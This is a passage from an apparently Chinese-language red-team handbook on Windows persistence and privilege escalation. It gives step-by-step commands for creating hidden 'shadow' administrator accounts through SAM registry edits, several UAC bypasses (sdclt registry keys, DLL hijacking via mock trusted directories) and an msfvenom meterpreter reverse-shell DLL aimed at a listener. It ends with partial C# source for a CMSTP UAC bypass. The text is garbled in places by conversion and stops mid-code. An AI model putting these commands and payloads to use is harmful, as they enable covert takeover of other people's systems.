>
> /删除删除计划任务
>
> /查显显所有计划任务
>
> /运行计划任务
>
> / End 中止当前正在运行的计划任务有效负载示例：
>
> \> SCHTASKS / Create / TN update / TR xx（待执行的命令）/ DELAY
> ONLOGON / F / RL HIGHEST
####### 影子账户
影子账户是指除了在注册表里面有用户记录，其他地方都不存在用户的信息.net
用户或计算机管理里本地用户和用户组是看不到用户信息的，具有很好的隐蔽性质。
> 1，用 \'\$\' 创建匿名用户，并加到管理员组cmd\> net user admin \$
> 123456 / add
>
> cmd\> net localgroup administrators admin \$ / add
> 2，导出匿名用户对应的SAM 目录下的注册表键值cmd\> regedt32.exe
>
> 打开HKEY_LOCAL_MACHINE \\ SAM \\ SAM
> \\域\\帐户\\用户键值，然后找到ADMIN \$
> 对应的类型以及文件夹，以及管理员对应的文件夹，将管理员文件夹中的˚F
> 值内容复制到ADMIN \$对应文件夹˚F 值中。
>
> PS：注意山姆键值在属性中给予管理员完全控制以及读取的权限，默认是不允许的3，删除匿名用户
>
> cmd\> net user admin \$ / del 4，还原匿名用户
>
> HKEY_LOCAL_MACHINE \\ SAM \\ SAM \\域\\帐户\\用户\\名称\\ ADMIN \$
>
> 双击导出的注册表文件，用先前导出的注册表键值对注册表进行修改，就可以重新还原之前的匿名用户
# 四.Privilege Escalation
权限提升是允许攻击者在系统或网络上获得更高级别权限的操作的结果。某些工具或操作需要更高级别的权限才能工作，并且在整个操作过程中的许多点可能都是必需的。攻击者可以进入具有非特权访问权限的系统，并且必须利用系统弱点来获取本地管理员或SYSTEM
/ root
级别权限。也可以使用具有类似管理员访问权限的用户帐户。具有访问特定系统的权限或执行攻击者实现其目标所必需的特定功能的用户帐户也可被视为权限的升级。
####### 账户权限介绍
从系统账户到数据库账户的提权
在此之前，我们需要弄清楚系统都有些什么权限，请阅读文末的参考信息：
-   配置Windows 服务帐户和权限
本地用户帐户 本地服务帐户：NT AUTHORITY \\ LOCAL SERVICE
网络服务帐户：NT AUTHORITY \\ NETWORK SERVICE 本地系统帐户：NT AUTHORITY
\\ SYSTEM
托管服务帐户：DOMAIN \\ ACCOUNTNAME 托管本地帐户/虚拟账户：NT SERVICE \\
以上权限都是用于服务数据库的账户，统称为操纵系统的账户
我们的目标是拿下数据库中的sysadmin
权限，从操纵系统的账户提权到数据库中的sysadmin 访问权限
-   如何操纵，请阅读文末的参考信息：如何使用PowerUpSQL
    将托管本地帐户提升为SQL Server Sysadmin 权限
> 考虑到信息差的问题，很多朋友可能第一次听说还有这么多的账户以及细分那么多
> 的权限，占据篇幅巨大。综合考虑以后，这里不能大量的出现学习细节。站在更高
> 级别的角度引到大家去哪里学，才是重中之重。
-   参考资料 配置Windows 服务帐户和权限：https://docs.microsoft.com/en-
    us/sql/database-engine/configure-windows/configure-windows-
    service-accounts-and-permissions?view=sql-server-2017 如何使用
    PowerUpSQL 将 托 管 本 地 帐 户 提 升 为 SQL Server Sysadmin 权 限
    ： https://blog.netspi.com/get-sql-server-sysadmin-privileges-local-
    admin-powerupsql/ 微 软 SQL Server 的 安 全 考 虑 ：
    https://docs.microsoft.com/en-us/sql/sql-server/install/security-
    considerations-for-a-sql-server-installation?view=sql-server-
    2017#isolated_services
2.  ####### Windows UAC：
    1.  *windows10*之*UAC*原理
账户被分为标准用户和管理员，登录系统以后会有对应的token
生成，它限制了访问等权限级别。
而系统中的所有任务的执行也对应的需要不同的账户的token，有的需要管理员级别的token，有的仅需要标准用户级别的token。
如果你的权限是管理员级别的token
去执行系统中的任务，那么还提个什么权，已经是最高级别权限了。
这里肯定是从标准用户权限提升到管理员权限去执行任务。
UAC 启动以后，不管你用什么账户登录，都是以标准用户的token 去执行任务
的。这样一来恶意软件就不能静悄悄的安装了。 它会弹出UAC
窗口，询问您是否安装。你是管理员账户，点同意直接就运行了。如果你是标准用户的账户，点同意，没有管理员的账号密码自然是阻止的。
弹出来的UAC 窗口叫做安全桌面，恶意程序也会模仿这个安全桌面弹一个UAC
的钓鱼窗口提示你点是。进一步设置请参考以下信息
-   不管是攻还是防，学的原理是一样的。我们需要弄清楚UAC，请参考文末参考资料：用户帐户控制的工作原理
具备以上知识以后，我们来谈谈无文件绕过UAC 不同国家的键盘设置不一样，
windows10 引入了fodhelper.exe 来控制这个。
读了下面参考资料后发现，文件签名中的两条标黄的XML 标签，使用google
翻译以后明白它可以自动提升权限到管理员。
再结合上面的知识，我们是不是有了管理员的权限去执行这个任务了啊：fodhelper.exe。
不对啊，上面说的一个进程要管理员权限执行的话会弹出UAC 安全桌面的窗口，
然后输入账号密码去认证啊，这怎么就自动提升不需要我们交互了？那我设置UAC
不就是如同虚设了吗？ 就是这么一回事，我们操作fodhelper.exe
这个进程的特性来控制它去加载cmd.exe，连同cmd.exe
进程都具备管理员的权限和对应的执行token 了。 shell
有了，权限也有了，就这样提权成功了，细节部分请参考资料：第一个条目：欢迎和无文件UAC
绕过
参考资料 用户帐户控制的工作原理：https://docs.microsoft.com/en-
us/windows/security/identity-protection/user-account-control/how-user-
account-control-works 第 一 个 条 目 ： 欢 迎 和 无 文 件 UAC 绕 过 ：
https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-
bypass/
##### 利用环境变量，通过计划任务无文件绕过*UAC*
有的人会设置计划任务定期清理磁盘：它叫SilentCleanup
它可以由标准用户（低权限）启动，那么问题来了，在配置各种任务的时候会有一些各种默认配置。用户他也不会特意研究这些选项，
当然是下一步下一步的完成了。其中的默认配置有一个：以最高权限运行。
运行时的进程为：cleanmgr.exe。 进程运行创建一个GUID
的新文件夹，将多个DLL
和"dismhost.exe"一起复制到此文件夹中加载。可以劫持由dismhost.exe
加载的DLL 获取代码执行的机会。通常称为： bypassUAC 攻 击 必 须 在
dismhost.exe 加 载 之 前 替 换 目 标 DLL，
"LogProvider.dll"是dismhost.exe
加载的最后一个DLL，为我们提供了获取劫持机会的最佳机会。
具体细节请阅读文末的参考资料：使用磁盘清理在WINDOWS 10 上绕过UAC
尝试修改环境变量来bypass
的类似细节请阅读文末的参考资料：利用环境变量bypassUAC
总结一下：用户有时会借助系统附带的各种功能，开启自动化的作业，这个开启过程里肯定有各种默认选项，这些过程会伴随很多安全问题出现。
而要发现这些过程是否有安全问题出现就需要通过多种角度去观察：进程行为，注册表行为，文件读写行为，环境变量等。
参 考 资 料 ： 使 用 磁 盘 清 理 在 WINDOWS 10 上 绕 过 UAC：
https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-
disk-cleanup/ 利 用 环 境 变 量 bypassUAC：
https://tyranidslair.blogspot.com/2017/05/exploiting-environment-
variables-in.html
###### sdclt_bypassuac(T1088)
![](media/image184.png){width="5.8051202974628175in" height="5.83in"}
> ![](media/image185.jpeg){width="5.833333333333333in"
> height="2.921666666666667in"}ht
tp://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass 写入注册表
> reg add \"HKCU\\Software\\Classes\\Folder\\shell\\open\\command\" /d
> \"cmd.exe /c notepad.exe\" /f &&
>
> reg add HKCU\\Software\\Classes\\Folder\\shell\\open\\command /v
> \"DelegateExecute\" /f
触发
> %windir%\\system32\\sdclt.exe
###### BypassUAC\|DLLHijacking(T1088)(T1038)
在C:\\Windows\\System32 目录中并且AutoElevate 为True 的 60
个二进制文件中， 总共有 13 个可以用于带有Mocking 可信目录的Hijacking
DLL。
> ![](media/image186.jpeg){width="5.585359798775153in" height="2.465in"}
以下可以看到劫持的DLL
![](media/image187.jpeg){width="5.758653762029747in" height="4.01625in"}
以下为原理图：
![](media/image188.jpeg){width="5.781037839020122in"
height="8.54437445319335in"}
msf 生成dll 并开启MSF 监听
> msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.0.0.117
> lport=444 -f dll -o comctl32.dll
劫持DLL 并提权
![](media/image189.jpeg){width="5.883594706911636in"
height="3.267915573053368in"}
> \$base =
> \"amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.1713
> 4.1_none_e4da93291059d8fb\"
>
> \[ System.io.directory\]::CreateDirectory(\"\\\\?\\\\c:\\\\Windows
> \\\\\")
>
> \[ System.io.directory\]:: CreateDirectory(\"C:\\\\Windows
> \\\\System32\")
>
> \[ System.io.file\]::Copy(
> \"C:\\Windows\\System32\\ComputerDefaults.exe\",\"C:\\Window s
> \\System32\\ComputerDefaults.exe\" )
>
> \[ System.io.directory\]::CreateDirectory( \"C:\\\\Windows
> \\\\System32\\\\ComputerDefa ults.exe.Local\" )
>
> \[ System.io.directory\]::CreateDirectory( \"C:\\\\Windows
> \\\\System32\\\\ComputerDefa ults.exe.Local\\\\\$base\" )
>
> \[ System.io.file\]::Copy(
> \"C:\\Users\\demon\\Desktop\\comctl32.dll\", \"c:\\\\Windows \\\\S
> ystem32\\\\ComputerDefaults.exe.Local\\\\\$base\\comctl32.dll\")
>
> Start-Process \"C:\\Windows \\System32\\ComputerDefaults.exe\"
https://[www.elladodelmal.com/2018/11/mocking-trusted-directory-uac-](http://www.elladodelmal.com/2018/11/mocking-trusted-directory-uac-)
bypass-en.html https://medium.com/tenable-techblog/uac-bypass-by-
mocking-trusted-directories-24a96675f6e
###### BypassUACwindowsdefender.(T1191)(T1088)
![](media/image190.jpeg){width="5.817267060367454in"
height="4.677083333333333in"}
https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-
in-newer-Windows-versions.html
> /\* UACBypassusingCMSTP.exemicrosoftbinary
>
> BasedonpreviousworkfromOddvarMoe
> https://oddvar.moe/2017/08/15/research-on-cmstp-exe/
>
> AndthisPowerShellscriptofTylerApplebaum
>
> https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6
> f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1
>
> Codeauthor:AndreMarques(@\_zc00l)
>
> \*/
>
> using System; using System.Text; using System.IO;
>
> using System.Diagnostics;
>
> using System.ComponentModel; using System.Windows;
>
> using System.Runtime.InteropServices;
>
> public class CMSTPBypass
>
> {
>
> //Our.INFfiledata!
>
> public static string InfData = @\"\[version\] Signature=\$chicago\$
>
> AdvancedINF=2.5
>
> \[DefaultInstall\] CustomDestination=CustInstDestSectionAllUsers
> RunPreSetupCommands=RunPreSetupCommandsSection
>
> \[RunPreSetupCommandsSection\]
>
> ; Commands Here will be run Before Setup Begins to install
> REPLACE_COMMAND_LINE
>
> taskkill /IM cmstp.exe /F
>
> \[CustInstDestSectionAllUsers\] 49000,49001=AllUSer_LDIDSection, 7
>
> \[AllUSer_LDIDSection\]
>
> \"\"HKLM\"\", \"\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App
> Paths\\CMMGR3 2.EXE\"\", \"\"ProfileInstallPath\"\",
> \"\"%UnexpectedError%\"\", \"\"\"\"
>
> \[Strings\] ServiceName=\"\"CorpVPN\"\" ShortSvcName=\"\"CorpVPN\"\"
>
> \";
>
> \[DllImport(\"user32.dll\")\] public static extern bool
> ShowWindow(IntPtr hWnd, int n CmdShow);
>
> \[DllImport(\"user32.dll\", SetLastError = true)\] public static
> extern bool SetForegro undWindow(IntPtr hWnd);
>
> public static string BinaryPath =
> \"c:\\\\windows\\\\system32\\\\cmstp.exe\";
>
> /\*Generatesarandomnamed.inffilewithcommandtobeexecutedwithUACp
> rivileges\*/
>
> public static string SetInfFile(string CommandToExecute)
>
> {
>
> \"))\[0\];
string RandomFileName =
Path.GetRandomFileName().Split(Convert.ToChar(\".
string TemporaryDir = \"C:\\\\windows\\\\temp\"; StringBuilder
OutputFile = new StringBuilder(); OutputFile.Append(TemporaryDir);
OutputFile.Append(\"\\\\\"); OutputFile.Append(RandomFileName);
OutputFile.Append(\".inf\");